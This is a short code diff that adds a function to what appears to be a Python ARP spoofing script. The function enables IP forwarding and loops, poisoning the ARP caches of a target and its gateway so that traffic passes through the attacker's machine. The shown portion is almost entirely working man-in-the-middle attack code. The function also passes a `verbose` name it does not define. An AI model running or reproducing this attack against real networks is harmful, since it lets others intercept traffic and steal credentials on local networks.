@@ -85,3 +85,19 @@ if __name__ == "__main__":
         print("[!] Restoring the network")
         restore(target, host)
         restore(host, target)
+
+def function_that_do_the_thing(target_ip, gateway_ip):
+    # enable ip forwarding
+    _enable_iproute()
+    try:
+        while True:
+            # telling the `target` that we are the `host`
+            spoof(target_ip, gateway_ip, verbose)
+            # telling the `host` that we are the `target`
+            spoof(gateway_ip, target_ip, verbose)
+            # sleep for one second
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("[!] Restoring the network")
+        restore(target_ip, gateway_ip)
+        restore(gateway_ip, target_ip)
